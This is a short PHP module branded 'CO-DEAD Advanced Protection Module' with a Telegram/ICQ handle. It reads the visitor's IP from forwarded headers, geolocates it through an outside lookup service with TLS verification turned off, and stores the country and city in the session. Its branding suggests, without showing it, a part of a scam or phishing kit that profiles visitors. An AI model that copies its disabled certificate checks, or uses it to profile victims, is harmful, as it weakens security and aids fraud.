<?php

/**
_________  ________             ________  ___________   _____  ________   
\_   ___ \ \_____  \            \______ \ \_   _____/  /  _  \ \______ \  
/    \  \/  /   |   \    ______  |    |  \ |    __)_  /  /_\  \ |    |  \ 
\     \____/    |    \  /_____/  |    `   \|        \/    |    \|    `   \
 \______  /\_______  /          /_______  /_______  /\____|__  /_______  /
        \/         \/                   \/        \/         \/        \/ 
		
			ICQ & Telegram = @CO_DEAD
            CO-DEAD Advanced Protection Module

            
 * DO NOT SELL THIS SCRIPT !
 * DO NOT CHANGE COPYRIGHT !
            
**/ 

error_reporting(0);
session_start();

if (!defined('CODEAD_PUBLIC_IP_FLAGS')) {
    define('CODEAD_PUBLIC_IP_FLAGS', FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE);
}

function getinfo()
{
    $fallbackIP = null;
    foreach (
        [
            "HTTP_CLIENT_IP",
            "HTTP_X_FORWARDED_FOR",
            "HTTP_X_FORWARDED",
            "HTTP_X_CLUSTER_CLIENT_IP",
            "HTTP_FORWARDED_FOR",
            "HTTP_FORWARDED",
            "REMOTE_ADDR",
        ]
        as $key
    ) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(",", $_SERVER[$key]) as $IPaddress) {
                $IPaddress = trim($IPaddress);
                if (
                    filter_var(
                        $IPaddress,
                        FILTER_VALIDATE_IP,
                        ["flags" => CODEAD_PUBLIC_IP_FLAGS]
                    ) !== false
                ) {
                    return $IPaddress;
                }

                if ($fallbackIP === null && filter_var($IPaddress, FILTER_VALIDATE_IP) !== false) {
                    $fallbackIP = $IPaddress;
                }
            }
        }
    }

    return $fallbackIP;
}
$ipAddress = getinfo();

$isValidIP = $ipAddress !== null
    && filter_var($ipAddress, FILTER_VALIDATE_IP) !== false;

$isPublicIP = $isValidIP
    && filter_var(
        $ipAddress,
        FILTER_VALIDATE_IP,
        ["flags" => CODEAD_PUBLIC_IP_FLAGS]
    ) !== false;

$_SESSION["ip_is_private"] = $isValidIP ? !$isPublicIP : false;

$getdetails = $isPublicIP
    ? "https://extreme-ip-lookup.com/json/" . $ipAddress
    : null;
$curl = curl_init();
if ($getdetails !== null) {
    curl_setopt($curl, CURLOPT_URL, $getdetails);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($curl);
    curl_close($curl);
    $details = json_decode($content);
} else {
    $details = null;
}

if (is_object($details)) {
    $_SESSION["country"] = $country = $details->country ?? "Unknown";
    $_SESSION["countrycode"] = $ccode = $details->countryCode ?? "Unknown";
    $_SESSION["city"] = $city = $details->city ?? "Unknown";
    $_SESSION["ip"] = $query = $details->query ?? $ipAddress ?? "Unknown";
} else {
    $_SESSION["country"] = $country = "Unknown";
    $_SESSION["countrycode"] = $ccode = "Unknown";
    $_SESSION["city"] = $city = "Unknown";
    $_SESSION["ip"] = $query = $ipAddress ?? "Unknown";
}


?>
